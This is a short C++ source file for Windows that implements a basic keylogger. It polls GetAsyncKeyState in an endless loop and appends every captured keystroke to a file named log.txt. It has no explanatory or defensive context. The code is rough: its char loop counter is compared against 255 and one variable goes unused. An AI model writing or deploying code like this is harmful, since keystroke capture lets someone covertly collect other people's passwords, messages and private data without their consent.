#include<iostream>
#include<fstream>
#include<windows.h>

using namespace std;

void Save(int _key,char *file)
{
	cout<<_key<<endl;

	fstream logfile;

	logfile.open(file,ios::app);
	if(!logfile)
    {
        cout<<"cannot open the file";
        exit(1);
    }
    if(_key>32)
    {
        logfile<<(char)_key<<endl;
    }
    else
    {
        logfile<<'['<<_key<<']'<<endl;
    }
    logfile.close();
	//FILE *OUTPUT_FILE;
	//OUTPUT_FILE = fopen(file,"a+");
	//fprintf(OUTPUT_FILE ,"%s",&_key);
	//fclose(OUTPUT_FILE);


}

int main()
{
	char i,filename;
	Sleep(10);
	while(true)
	{
		for(i=8;i<255;i++)
		{
			if(GetAsyncKeyState(i) == -32767)
			{
				Save(i,"log.txt");


			}

		}

	}
return 0;
}

